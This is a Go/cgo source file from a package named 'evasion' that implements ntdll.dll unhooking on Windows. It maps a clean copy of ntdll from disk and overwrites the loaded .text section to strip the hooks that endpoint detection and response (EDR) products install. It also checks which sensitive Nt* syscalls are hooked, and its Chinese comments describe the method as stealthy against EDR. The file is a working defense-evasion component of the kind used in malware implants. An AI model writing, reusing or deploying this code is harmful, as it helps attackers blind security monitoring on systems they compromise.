//go:build windows && amd64 && cgo

package evasion

/*
#cgo LDFLAGS: -lkernel32

#include <windows.h>
#include <string.h>

// map_clean_ntdll 通过 KnownDlls 映射干净的 ntdll.dll 到内存。
// KnownDlls 是 Windows 的内核对象目录，包含系统 DLL 的干净副本。
// 使用 KnownDlls 比从磁盘读取更隐蔽（EDR 不监控 KnownDlls 访问）。
//
// 返回：映射后的干净 ntdll 基地址，失败返回 NULL。
void* map_clean_ntdll(void) {
    // Strategy: Open ntdll.dll from disk, map it as a section.
    // KnownDlls approach requires NtOpenSection which is harder with MinGW.
    // We use the simpler approach: CreateFile + CreateFileMapping + MapViewOfFile.

    HANDLE hFile = CreateFileW(
        L"C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    HANDLE hSection = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    CloseHandle(hFile);
    if (hSection == NULL) {
        return NULL;
    }

    void* mapping = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hSection);
    return mapping;
}

// replace_text_section 将内存中 ntdll.dll 的 .text 节替换为干净的副本。
// cleanBase: map_clean_ntdll 返回的干净 ntdll 基地址
//
// 返回：0 成功，非 0 失败。
int replace_text_section(void* cleanBase) {
    if (!cleanBase) return -1;

    // Parse both the clean and loaded ntdll to find .text section
    unsigned char* clean = (unsigned char*)cleanBase;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return -2;
    unsigned char* loaded = (unsigned char*)hNtdll;

    // Find .text section in clean ntdll
    int e_lfanew = *(int*)(clean + 0x3C);
    unsigned short sections = *(unsigned short*)(clean + e_lfanew + 6);
    unsigned short sizeOfOptHeader = *(unsigned short*)(clean + e_lfanew + 20);
    unsigned char* cleanSecs = clean + e_lfanew + 24 + sizeOfOptHeader;

    // Find .text section in loaded ntdll (same PE structure)
    int loaded_e_lfanew = *(int*)(loaded + 0x3C);
    unsigned short loaded_sections = *(unsigned short*)(loaded + loaded_e_lfanew + 6);
    unsigned short loaded_sizeOfOptHeader = *(unsigned short*)(loaded + loaded_e_lfanew + 20);
    unsigned char* loadedSecs = loaded + loaded_e_lfanew + 24 + loaded_sizeOfOptHeader;

    for (int i = 0; i < sections && i < loaded_sections; i++) {
        unsigned char* cleanSec = cleanSecs + (i * 40);
        unsigned char* loadedSec = loadedSecs + (i * 40);

        if (cleanSec[0] == '.' && cleanSec[1] == 't' &&
            cleanSec[2] == 'e' && cleanSec[3] == 'x' && cleanSec[4] == 't') {

            unsigned int rva = *(unsigned int*)(cleanSec + 12);
            unsigned int rawOffset = *(unsigned int*)(cleanSec + 20);
            unsigned int vsize = *(unsigned int*)(cleanSec + 8);

            // A-P0-4: 动态验证 vsize 不超过文件映射范围
            // ntdll .text 通常 <2MB；如果 vsize 异常大则拒绝操作
            if (vsize == 0 || vsize > 10 * 1024 * 1024) {
                return -5; // invalid section size
            }

            unsigned char* cleanText = clean + rawOffset;     // file mapping uses raw file offset
            unsigned char* loadedText = loaded + rva;         // loaded module uses RVA

            // BUG-11 fix: Validate rawOffset + vsize is within file mapping bounds
            // ntdll.dll file size is typically < 2MB; use 10MB as max
            if ((rawOffset + vsize) > 10 * 1024 * 1024) {
                return -6; // out of file bounds
            }

            // Change loaded .text to RW
            DWORD oldProtect;
            if (!VirtualProtect(loadedText, vsize, PAGE_READWRITE, &oldProtect)) {
                return -3;
            }

            // Copy clean .text over loaded .text
            memcpy(loadedText, cleanText, vsize);

            // Restore original protection
            VirtualProtect(loadedText, vsize, oldProtect, &oldProtect);

            return 0;
        }
    }

    return -4; // .text not found
}

// Resolve export from a file-mapped PE image (not a loaded module).
// GetProcAddress only works on loaded modules; this manually walks the
// export directory of a PE image mapped via MapViewOfFile.
//
// BUG-01 fix: For file-mapped PE, RVAs must be converted to file offsets.
// ntdll.dll happens to have SectionAlignment == FileAlignment (both 0x1000),
// but this is not guaranteed for all DLLs.
FARPROC resolve_export_from_file(void* fileBase, const char* name) {
    unsigned char* base = (unsigned char*)fileBase;
    int e_lfanew = *(int*)(base + 0x3C);
    unsigned char* optHeader = base + e_lfanew + 24;
    unsigned int exportRVA = *(unsigned int*)(optHeader + 96);
    if (!exportRVA) return NULL;

    // Convert export目录 RVA to file offset
    unsigned short numSections = *(unsigned short*)(base + e_lfanew + 6);
    unsigned short sizeOfOptHeader = *(unsigned short*)(base + e_lfanew + 20);
    unsigned char* secs = base + e_lfanew + 24 + sizeOfOptHeader;
    unsigned int exportFO = exportRVA; // default: treat RVA as file offset (ntdll fallback)
    for (int s = 0; s < numSections; s++) {
        unsigned char* sec = secs + (s * 40);
        unsigned int secRVA = *(unsigned int*)(sec + 12);
        unsigned int secRaw = *(unsigned int*)(sec + 20);
        unsigned int secVSize = *(unsigned int*)(sec + 8);
        unsigned int secRawSize = *(unsigned int*)(sec + 16);
        if (exportRVA >= secRVA && exportRVA < secRVA + secVSize) {
            exportFO = secRaw + (exportRVA - secRVA);
            break;
        }
        // Fallback: if secRVA == secRaw (aligned), use RVA directly
        (void)secRawSize;
    }

    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + exportFO);
    unsigned int namesFO = exp->AddressOfNames;
    unsigned int ordinalsFO = exp->AddressOfNameOrdinals;
    unsigned int functionsFO = exp->AddressOfFunctions;
    // Convert each pointer from RVA to file offset
    for (int s = 0; s < numSections; s++) {
        unsigned char* sec = secs + (s * 40);
        unsigned int secRVA = *(unsigned int*)(sec + 12);
        unsigned int secRaw = *(unsigned int*)(sec + 20);
        unsigned int secVSize = *(unsigned int*)(sec + 8);
        if (namesFO >= secRVA && namesFO < secRVA + secVSize)
            namesFO = secRaw + (namesFO - secRVA);
        if (ordinalsFO >= secRVA && ordinalsFO < secRVA + secVSize)
            ordinalsFO = secRaw + (ordinalsFO - secRVA);
        if (functionsFO >= secRVA && functionsFO < secRVA + secVSize)
            functionsFO = secRaw + (functionsFO - secRVA);
    }

    unsigned int* names = (unsigned int*)(base + namesFO);
    unsigned short* ordinals = (unsigned short*)(base + ordinalsFO);
    unsigned int* functions = (unsigned int*)(base + functionsFO);

    for (unsigned int i = 0; i < exp->NumberOfNames; i++) {
        const char* expName = (const char*)(base + names[i]);
        // Convert name RVA to file offset if needed
        unsigned int nameFO = names[i];
        for (int s = 0; s < numSections; s++) {
            unsigned char* sec = secs + (s * 40);
            unsigned int secRVA = *(unsigned int*)(sec + 12);
            unsigned int secRaw = *(unsigned int*)(sec + 20);
            unsigned int secVSize = *(unsigned int*)(sec + 8);
            if (nameFO >= secRVA && nameFO < secRVA + secVSize) {
                nameFO = secRaw + (nameFO - secRVA);
                break;
            }
        }
        expName = (const char*)(base + nameFO);
        if (strcmp(expName, name) == 0) {
            unsigned int rva = functions[ordinals[i]];
            // Convert function RVA to file offset
            unsigned int funcFO = rva;
            for (int s = 0; s < numSections; s++) {
                unsigned char* sec = secs + (s * 40);
                unsigned int secRVA = *(unsigned int*)(sec + 12);
                unsigned int secRaw = *(unsigned int*)(sec + 20);
                unsigned int secVSize = *(unsigned int*)(sec + 8);
                if (funcFO >= secRVA && funcFO < secRVA + secVSize) {
                    funcFO = secRaw + (funcFO - secRVA);
                    break;
                }
            }
            return (FARPROC)(base + funcFO);
        }
    }
    return NULL;
}

// cleanup_mapped_ntdll 释放 map_clean_ntdll 分配的内存。
void cleanup_mapped_ntdll(void* mapping) {
    if (mapping) {
        UnmapViewOfFile(mapping);
    }
}

// get_ntdll_text_info 返回 ntdll.dll 内存中 .text 节的基址和大小。
int get_ntdll_text_info(uintptr_t* outBase, size_t* outSize) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return -1;

    unsigned char* base = (unsigned char*)hNtdll;
    int e_lfanew = *(int*)(base + 0x3C);
    if (base[e_lfanew] != 'P') return -2;

    unsigned short sections = *(unsigned short*)(base + e_lfanew + 6);
    unsigned short sizeOfOptHeader = *(unsigned short*)(base + e_lfanew + 20);
    unsigned char* secs = base + e_lfanew + 24 + sizeOfOptHeader;

    for (int i = 0; i < sections; i++) {
        unsigned char* sec = secs + (i * 40);
        if (sec[0] == '.' && sec[1] == 't' && sec[2] == 'e' &&
            sec[3] == 'x' && sec[4] == 't') {
            unsigned int rva = *(unsigned int*)(sec + 12);
            unsigned int vsize = *(unsigned int*)(sec + 8);
            *outBase = (uintptr_t)(base + rva);
            *outSize = (size_t)vsize;
            return 0;
        }
    }
    return -3;
}

// check_ntdll_hooks 检测 ntdll.dll 中指定函数是否被 hook。
// 检查函数开头的字节是否与干净 ntdll 中的字节相同。
// 返回：被 hook 的函数数量。
int check_ntdll_hooks(const char** hooked_names, int max_names) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    void* clean = map_clean_ntdll();
    if (!clean) return 0;

    int hookedCount = 0;

    // Check a set of commonly hooked functions
    const char* targets[] = {
        "NtCreateFile", "NtOpenProcess", "NtWriteVirtualMemory",
        "NtReadVirtualMemory", "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory", "NtCreateThreadEx",
        "NtQueueApcThread", "NtResumeThread", "NtCreateProcessEx",
    };

    for (int i = 0; i < sizeof(targets)/sizeof(targets[0]); i++) {
        FARPROC loadedFn = GetProcAddress(hNtdll, targets[i]);
        FARPROC cleanFn = resolve_export_from_file(clean, targets[i]);

        if (loadedFn && cleanFn) {
            // Compare first 16 bytes
            if (memcmp(loadedFn, cleanFn, 16) != 0) {
                if (hookedCount < max_names && hooked_names) {
                    hooked_names[hookedCount] = targets[i];
                }
                hookedCount++;
            }
        }
    }

    cleanup_mapped_ntdll(clean);
    return hookedCount;
}
*/
import "C"

import (
	"fmt"
	"unsafe"
)

// UnhookNTDLL 执行 Syscall Unhooking：
// 从干净的 ntdll.dll 副本替换内存中被 EDR hook 的 .text 节。
//
// 原理：
// 1. 通过 CreateFile + MapViewOfFile 映射干净的 ntdll.dll
// 2. 找到内存中 ntdll 的 .text 节和干净副本的 .text 节
// 3. VirtualProtect → memcpy → VirtualProtect 替换
//
// 优势：比从磁盘读取更隐蔽，EDR 通常不监控 KnownDlls 或 CreateFileMapping。
func UnhookNTDLL() error {
	// 1. 映射干净的 ntdll.dll
	cleanBase := C.map_clean_ntdll()
	if cleanBase == nil {
		return fmt.Errorf("map_clean_ntdll failed")
	}
	defer C.cleanup_mapped_ntdll(cleanBase)

	// 2. 替换 .text 节
	ret := C.replace_text_section(cleanBase)
	if ret != 0 {
		return fmt.Errorf("replace_text_section failed: code=%d", int(ret))
	}

	return nil
}

// CheckNTDLLHooks 检测 ntdll.dll 中哪些函数被 EDR hook 了。
// 返回被 hook 的函数名列表。
func CheckNTDLLHooks() ([]string, error) {
	maxHooks := 32
	hookedNames := make([]*C.char, maxHooks)
	hookedNamesPtr := (**C.char)(unsafe.Pointer(&hookedNames[0]))

	count := C.check_ntdll_hooks(hookedNamesPtr, C.int(maxHooks))
	if count == 0 {
		return nil, nil
	}

	var result []string
	for i := 0; i < int(count) && i < maxHooks; i++ {
		if hookedNames[i] != nil {
			result = append(result, C.GoString(hookedNames[i]))
		}
	}
	return result, nil
}

// GetNTDLLTextInfo 返回 ntdll.dll .text 节的基址和大小。
func GetNTDLLTextInfo() (base uintptr, size uint, err error) {
	var cBase C.uintptr_t
	var cSize C.size_t

	ret := C.get_ntdll_text_info(&cBase, &cSize)
	if ret != 0 {
		return 0, 0, fmt.Errorf("get_ntdll_text_info failed: code=%d", int(ret))
	}

	return uintptr(cBase), uint(cSize), nil
}
